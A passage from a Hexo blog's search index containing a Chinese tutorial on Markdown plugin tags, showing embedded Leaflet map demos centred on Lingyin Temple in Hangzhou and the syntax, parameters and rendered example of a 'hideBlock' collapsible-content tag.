src="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.js"></script><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet.ChineseTmsProviders@1.0.4.js"></script><div class="map-box" style="margin: 0.8rem 0 1.6rem 0;"><div id="map-120.101101-30.239119" style="max-width:100%; height:360px;display: block;margin:0 auto;z-index:1;border-radius: 5px;"></div></div><script type="text/javascript">var normalm=L.tileLayer.chinaProvider('GaoDe.Normal.Map',{maxZoom:20,minZoom:1,attribution:'高德地图'});var imgm=L.tileLayer.chinaProvider('GaoDe.Satellite.Map',{maxZoom:20,minZoom:1,attribution:'高德地图'});var imga=L.tileLayer.chinaProvider('GaoDe.Satellite.Annotion',{maxZoom:20,minZoom:1,attribution:'高德地图'});var normalMap=L.tileLayer.chinaProvider('Google.Normal.Map',{maxZoom:20,minZoom:1,attribution:'Google Maps'}),satelliteMap=L.tileLayer.chinaProvider('Google.Satellite.Map',{maxZoom:21,minZoom:1,attribution:'Google Maps'});routeMap=L.tileLayer.chinaProvider('Google.Satellite.Annotion',{maxZoom:21,minZoom:1});var normalMap=L.tileLayer.chinaProvider('Google.Normal.Map',{maxZoom:21,minZoom:1,attribution:'Google Maps'}),satelliteMap=L.tileLayer.chinaProvider('Google.Satellite.Map',{maxZoom:21,minZoom:1,attribution:'Google Maps'}),routeMap=L.tileLayer.chinaProvider('Google.Satellite.Annotion',{maxZoom:21,minZoom:1,attribution:'Google Maps'});var normalm1=L.tileLayer.chinaProvider('Geoq.Normal.Map',{maxZoom:21,minZoom:1,attribution:'GeoQ'});var normal=L.layerGroup([normalm]),image=L.layerGroup([imgm,imga]);var baseLayers={"高德地图":normal,"智图地图":normalm1,"谷歌地图":normalMap,"高德卫星地图":imgm,"谷歌卫星地图":satelliteMap,"高德卫星标注":image,"谷歌卫星标注":routeMap};var mymap=L.map('map-120.101101-30.239119',{center:[30.239119,120.101101],zoom:14,layers:[normal],zoomControl:false});L.control.layers(baseLayers,null).addTo(mymap);L.control.zoom({zoomInTitle:'放大',zoomOutTitle:'缩小'}).addTo(mymap);</script><br><link rel="stylesheet" href="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.css"><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.js"></script><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet.ChineseTmsProviders@1.0.4.js"></script><div id="googleMap-120.101101-30.239119" style="max-width:100%; height:360px;display: block;margin:0 auto;z-index:1;border-radius: 5px;"></div><script type="text/javascript">var normalMap=L.tileLayer.chinaProvider('Google.Normal.Map',{maxZoom:22,minZoom:1,attribution:'Google Maps'}),satelliteMap=L.tileLayer.chinaProvider('Google.Satellite.Map',{maxZoom:22,minZoom:1,attribution:'Google Maps'}),routeMap=L.tileLayer.chinaProvider('Google.Satellite.Annotion',{maxZoom:22,minZoom:1,attribution:'Google Maps'});var baseLayers={"谷歌地图":normalMap,"谷歌卫星图":satelliteMap,"谷歌卫星标注": routeMap};var overlayLayers={};var mymap=L.map("googleMap-120.101101-30.239119",{center:[30.239119,120.101101],zoom:14,layers:[normalMap],zoomControl:false});L.control.layers(baseLayers,null).addTo(mymap);L.control.zoom({zoomInTitle:'放大',zoomOutTitle:'缩小'}).addTo(mymap);var marker = L.marker(['30.239119','120.101101']).addTo(mymap);marker.bindPopup("这里是西湖灵隐寺，据说求姻缘很灵验哦！").openPopup();</script><br><link rel="stylesheet" href="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.css"><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.js"></script><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet.ChineseTmsProviders@1.0.4.js"></script><div id="geoqMap-120.101101-30.239119" style="max-width:90%; height:320px;display: block;margin:0 auto;z-index:1;border-radius: 5px;"></div><script type="text/javascript">var normalm1=L.tileLayer.chinaProvider('Geoq.Normal.Map',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var normalm2=L.tileLayer.chinaProvider('Geoq.Normal.PurplishBlue',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var normalm3=L.tileLayer.chinaProvider('Geoq.Normal.Gray',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var normalm4=L.tileLayer.chinaProvider('Geoq.Normal.Warm',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var normalm5=L.tileLayer.chinaProvider('Geoq.Theme.Hydro',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var normal=L.layerGroup([normalm1,normalm2,normalm3,normalm4,normalm5]);var baseLayers={"智图地图":normalm1,"午夜蓝":normalm2,"灰色":normalm3,"暖色":normalm4,"水系":normalm5};var mymap=L.map("geoqMap-120.101101-30.239119",{center:[30.239119,120.101101],zoom:13,layers:[normalm3],zoomControl:false});L.control.layers(baseLayers,null).addTo(mymap);L.control.zoom({zoomInTitle:'放大',zoomOutTitle:'缩小'}).addTo(mymap);var marker = L.marker(['30.239119','120.101101']).addTo(mymap);marker.bindPopup("这里是西湖灵隐寺，据说求姻缘很灵验哦！").openPopup();</script><br><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-31-隐藏块">2.31 隐藏块</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">标签语法</button></li><li class="tab"><button type="button" data-href="#分栏-2">参数配置</button></li><li class="tab"><button type="button" data-href="#分栏-3">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-4">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% hideBlock display,bg,color %&#125;</span><br><span class="line">content</span><br><span class="line">&#123;% endhideBlock %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ol><li>content：要隐藏的内容</li><li>display：展示前按钮显示的文字（可选）</li><li>bg：按钮的背景颜色（可选）</li><li>color：按钮显示的文字的颜色（可选）</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% hideBlock 点我预览, blue %&#125;</span><br><span class="line">这里有张图片：</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://s1.vika.cn/space/2022/10/30/b35fce448bc9404a8d65c3ce1e6e46eb&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;image (1)&quot;</span> <span class="attr">style</span>=<span class="string">&quot;zoom:67%;&quot;</span> /&gt;</span></span></span><br><span class="line">&#123;% endhideBlock %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-4"><div class="hide-block"><button type="button" class="hide-button" style="background-color:  blue;">点我预览    </button><div class="hide-content"><p>这里有张图片：<br><img src="https://s1.vika.cn/space/2022/10/30/b35fce448bc9404a8d65c3ce1e6e46eb" alt="image (1)" style="zoom:67%;" /></p></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>]]></content>
      
      
      <categories>
          
          <category> 演示 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Markdown </tag>
            
            <tag> 外挂标签 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
